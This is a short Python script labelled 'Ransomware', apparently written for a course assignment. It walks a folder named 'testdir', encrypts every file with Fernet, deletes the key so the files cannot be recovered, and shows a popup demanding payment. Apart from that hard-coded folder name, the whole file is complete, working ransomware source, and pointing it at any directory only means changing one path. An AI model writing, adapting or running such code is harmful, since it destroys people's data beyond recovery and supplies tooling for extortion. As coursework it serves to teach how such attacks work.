#!/usr/bin/python3

# Script Name: Ransomware
# Author Name: Carsten Rossen
# Date of Latest Revision: 8/01/21
# Purpose: Encrypts all the files in a specified directory.

# NOTE: For the purposes of this assignment, I have created a throw away folder to encrypt called "testdir"
# The path for this folder is specified on line 69. THIS SCRIPT WILL ENCRYPT THE CONTENTS OF 
# THIS FOLDER AND DELETE THE KEY. MAKE SURE YOU CHECK AND MAKE NECESSARY CHANGES TO THE 
# NAME OF THE FOLDER ON LINE 69 BEFORE RUNNING THIS SCRIPT.


# Import libraries
from cryptography.fernet import Fernet
import os
import tkinter as tk
from tkinter import ttk


# Declare variables
# Set font size for the popup message
NORM_FONT = ("Helvetica", 10)


# Define functions

# Generate a key to encrypt files with
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

# Return the generated key 
def load_key():
    return open("secret.key", "rb").read()

# Encrypt a file with the generated key
def encrypt_file(path):
    # Load the key
    key = load_key()
    fernet = Fernet(key)
    # Read the file
    with open(path, "rb") as file:
        original = file.read()
    # Encrypt the file
    encrypted = fernet.encrypt(original)
    # Write the encrypted file to the original file
    with open(path, "wb") as encrypted_file:
        encrypted_file.write(encrypted)

# Create a popup alert telling the user that they've been attacked
def popupmsg(msg):
    popup = tk.Tk()
    popup.wm_title("You have been hit with ransomware!")
    label = ttk.Label(popup, text=msg, font=NORM_FONT)
    label.pack(side="top", fill="x", pady=10)
    B1 = ttk.Button(popup, text="Okay", command = popup.destroy)
    B1.pack()
    popup.mainloop()


# Main

# Generate the encryption key
generate_key()

# Walk through all the files in the specified directory.
for root, dirs, files in os.walk("testdir", topdown=False):
    for file in files:
        path = os.path.join(root, file)
        encrypt_file(path)

# Throw away the key (bwahaha)
os.remove("secret.key")

# Create popup alert with this message.
popupmsg("Every file on your computer has been encrypted. You must now pay me absurd amounts of money to get it back.")


# End
